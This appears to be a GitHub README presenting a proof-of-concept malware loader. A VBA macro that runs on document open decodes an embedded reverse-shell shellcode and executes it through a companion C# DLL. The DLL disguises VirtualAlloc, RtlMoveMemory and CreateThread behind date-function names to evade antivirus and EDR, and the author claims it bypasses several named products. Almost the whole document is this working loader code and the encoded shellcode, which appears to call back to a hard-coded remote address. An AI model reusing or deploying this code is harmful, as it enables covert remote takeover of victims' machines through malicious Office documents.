# VBAShellCodeCallFuncInDLL

This PoC shows how to execute shellcode from VBA, RtlMoveMemory, VirtualAlloc and CreateThread is moved to funcshell.dll
reverse shell execute. Tested on Windows Defender Enterprise, Trend Micro Apex One, Cisco AMP all bypass.


VBA NewMacros:
```
Declare PtrSafe Function DateValue Lib "C:\Windows\Tasks\funcshell.dll" (ByVal B1 As Long, ByVal B2 As Long, ByVal B3 As LongPtr, B4 As Long, ByVal B5 As Long, B6 As Long) As LongPtr
Declare PtrSafe Function DateDiff Lib "C:\Windows\Tasks\funcshell.dll" (ByVal C1 As Long, ByVal C2 As Long, ByVal C3 As Long, ByVal C4 As Long) As LongPtr
Declare PtrSafe Function DateAdd Lib "C:\Windows\Tasks\funcshell.dll" (ByVal D1 As LongPtr, ByRef D2 As Any, ByVal D3 As Long) As LongPtr

Sub AutoOpen()
    Dim Stuff As Long
    Dim PtrAdr As LongPtr
    code = _
    "Q232 Q130 Q000 Q000 Q000 Q096 Q137 Q229 Q049 Q192 Q100 Q139 Q080 Q048 Q139 Q082 Q012 Q139 Q082 Q020 Q139 Q114 Q040 Q015 Q183 " + _
    "Q074 Q038 Q049 Q255 Q172 Q060 Q097 Q124 Q002 Q044 Q032 Q193 Q207 Q013 Q001 Q199 Q226 Q242 Q082 Q087 Q139 Q082 Q016 Q139 Q074 " + _
    "Q060 Q139 Q076 Q017 Q120 Q227 Q072 Q001 Q209 Q081 Q139 Q089 Q032 Q001 Q211 Q139 Q073 Q024 Q227 Q058 Q073 Q139 Q052 Q139 Q001 " + _
    "Q214 Q049 Q255 Q172 Q193 Q207 Q013 Q001 Q199 Q056 Q224 Q117 Q246 Q003 Q125 Q248 Q059 Q125 Q036 Q117 Q228 Q088 Q139 Q088 Q036 " + _
    "Q001 Q211 Q102 Q139 Q012 Q075 Q139 Q088 Q028 Q001 Q211 Q139 Q004 Q139 Q001 Q208 Q137 Q068 Q036 Q036 Q091 Q091 Q097 Q089 Q090 " + _
    "Q081 Q255 Q224 Q095 Q095 Q090 Q139 Q018 Q235 Q141 Q093 Q104 Q051 Q050 Q000 Q000 Q104 Q119 Q115 Q050 Q095 Q084 Q104 Q076 Q119 " + _
    "Q038 Q007 Q255 Q213 Q184 Q144 Q001 Q000 Q000 Q041 Q196 Q084 Q080 Q104 Q041 Q128 Q107 Q000 Q255 Q213 Q080 Q080 Q080 Q080 Q064 " + _
    "Q080 Q064 Q080 Q104 Q234 Q015 Q223 Q224 Q255 Q213 Q151 Q106 Q005 Q104 Q087 Q057 Q141 Q215 Q104 Q002 Q000 Q001 Q187 Q137 Q230 " + _
    "Q106 Q016 Q086 Q087 Q104 Q153 Q165 Q116 Q097 Q255 Q213 Q133 Q192 Q116 Q012 Q255 Q078 Q008 Q117 Q236 Q104 Q240 Q181 Q162 Q086 " + _
    "Q255 Q213 Q104 Q099 Q109 Q100 Q000 Q137 Q227 Q087 Q087 Q087 Q049 Q246 Q106 Q018 Q089 Q086 Q226 Q253 Q102 Q199 Q068 Q036 Q060 " + _
    "Q001 Q001 Q141 Q068 Q036 Q016 Q198 Q000 Q068 Q084 Q080 Q086 Q086 Q086 Q070 Q086 Q078 Q086 Q086 Q083 Q086 Q104 Q121 Q204 Q063 " + _
    "Q134 Q255 Q213 Q137 Q224 Q078 Q086 Q070 Q255 Q048 Q104 Q008 Q135 Q029 Q096 Q255 Q213 Q187 Q240 Q181 Q162 Q086 Q104 Q166 Q149 " + _
    "Q189 Q157 Q255 Q213 Q060 Q006 Q124 Q010 Q128 Q251 Q224 Q117 Q005 Q187 Q071 Q019 Q114 Q111 Q106 Q000 Q083 Q255 Q213"

    PtrAdr = DateDiff(0, 323, &H1000, &H40)
    Dim u, h As Long
    h = 2
    For u = 0 To 322
      Stuff = DateAdd(PtrAdr + u, CByte(Mid$(code, h, 3)), 1)
      h = h + 5
    Next u
    Stuff = DateValue(0, 0, PtrAdr, 0, 0, 0)
End Sub
```

C# funcshell.dll compiled with csc.exe entrypoint .export[1] .export[2] .export[3] to represent the three function DateValue, DateDiff and DateAdd. 

funcshell.dll:
```

using System;
using System.Runtime.InteropServices;

namespace Code
{
    public class Program
    {
        public static unsafe IntPtr DateAdd(IntPtr Destination, IntPtr Source, byte Length)
        {
            IntPtr result = AddMinutes(Destination, Source, Length);
            return result;
        }

				public static unsafe UInt32 DateDiff(UInt32 lpStartAddr,	UInt32 size, UInt32 flAllocationType, UInt32 flProtect)
        {
            UInt32 result = AddMinutes(lpStartAddr, size, flAllocationType, flProtect);
            return result;
        }

        public static unsafe IntPtr DateValue(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId)
        {
            IntPtr result = AddMinutes(lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, ref lpThreadId);
            return result;
        }


//      blindfold AV/EDR - AddMinutes is used to call RtlMoveMemory, VirtualAlloc and CreateThread
				class Monday { public const string day = "RtlMoveMemory"; }
        [DllImport("Kernel32.dll", EntryPoint=Monday.day, SetLastError=false)]
        static unsafe extern IntPtr AddMinutes(IntPtr dest, IntPtr src, byte size);

				class Tuesday { public const string day = "VirtualAlloc"; }
        [DllImport("kernel32", EntryPoint = Tuesday.day)]
      	private static extern UInt32 AddMinutes(UInt32 lpStartAddr,	UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

				class Wednesday { public const string day = "CreateThread"; }
        [DllImport("kernel32", EntryPoint = Wednesday.day)]
        private static extern IntPtr AddMinutes(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    }
}
```


